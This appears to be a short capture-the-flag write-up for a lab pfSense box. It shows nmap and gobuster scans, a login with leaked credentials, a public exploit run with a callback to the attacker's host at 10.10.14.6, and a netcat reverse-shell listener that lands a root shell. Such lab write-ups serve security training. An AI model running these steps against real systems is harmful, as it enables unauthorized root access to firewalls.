![[Pasted image 20240720105845.png]]

**Ping**
```
ping 10.10.10.60
```
![[Pasted image 20240620184846.png]]

Nmap Default Scan
```
nmap 10.10.10.60 -oN dnmap
```
![[Pasted image 20240620184931.png]]

Nmap Service and Script Scan
```
nmap 10.10.10.60 -sC -sV -A -oN snmap
```
![[Pasted image 20240620185142.png]]

Nmap All Port scan
```
nmap 10.10.10.60 -p- --open -T5 -oN anmap
```
![[Pasted image 20240620185657.png]]

Gobuster Scan
```
gobuster dir -u https://10.10.10.60 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -k -x php,html,txt,bak,conf -s 200,204,301,302,307,403 -k --status-codes "" -o gobuster443.txt
```


Port 443:
https://10.10.10.60/index.php
![[Pasted image 20240620194008.png]]
The website is running **pfsense**

pfsense default creds
![[Pasted image 20240620193844.png]]

Default creds doesn't worked


We got creds
https://10.10.10.60/system-users.txt
![[Pasted image 20240620194126.png]]
Password should be pfsense, because that is the default password for pfsense, will check

It worked.....!
![[Pasted image 20240620194257.png]]
Creds **rohit:pfsense**
Also we can se the pfsense version.



Will search Public Exploit for the pfsense Version
![[Pasted image 20240620194604.png]]
Found one https://www.exploit-db.com/exploits/43560

As Always saved the python code in file named exp.py and ran the exploit accordingly
```
python3 exp.py --rhost 10.10.10.60 --lhost 10.10.14.6 --lport 443 --username rohit --password pfsense
```
![[Pasted image 20240620195826.png]]

Got Reverse shell
```
rlwrap nc -nvlp 443
```
![[Pasted image 20240620195916.png]]
We ARe R0o1....!

No need privilege escalation as we already landed in a Root Shell

**root.txt**
![[Pasted image 20240620200053.png]]

user.txt
![[Pasted image 20240620200125.png]]




Done with Sense.....:)
